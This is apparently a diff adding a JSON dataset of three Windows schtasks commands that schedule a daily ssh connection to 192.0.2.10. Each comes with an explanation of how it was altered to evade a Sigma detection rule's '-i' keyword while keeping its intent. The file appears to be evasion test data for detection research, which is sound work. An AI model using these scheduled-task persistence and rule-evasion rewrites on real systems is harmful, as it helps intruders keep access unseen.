@@ -1,0 +1,14 @@
+[
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -i C:\\Lab\\input\\sample.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Substitution: Replaced the suspicious path 'C:\\Temp\\test.txt' with a benign lab placeholder 'C:\\Lab\\input\\sample.txt' to avoid matching the Sigma rule's '-i' keyword without altering the command's intent."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe -f C:\\Lab\\input\\sample.txt user@192.0.2.10\" /sc daily",
+    "explanation": "Substitution: Replaced the '-i' flag with '-f' (a valid flag for ssh) and used a benign lab placeholder to avoid matching the Sigma rule's '-i' keyword while maintaining the command structure."
+  },
+  {
+    "output": "schtasks.exe /create /tn \"TestTask1\" /tr \"C:\\Windows\\System32\\OpenSSH\\ssh.exe user@192.0.2.10\" /sc daily",
+    "explanation": "Omission: Removed the '-i' flag and its associated path to avoid triggering the Sigma rule's '-i' keyword, while preserving the core intent of the command."
+  }
+]
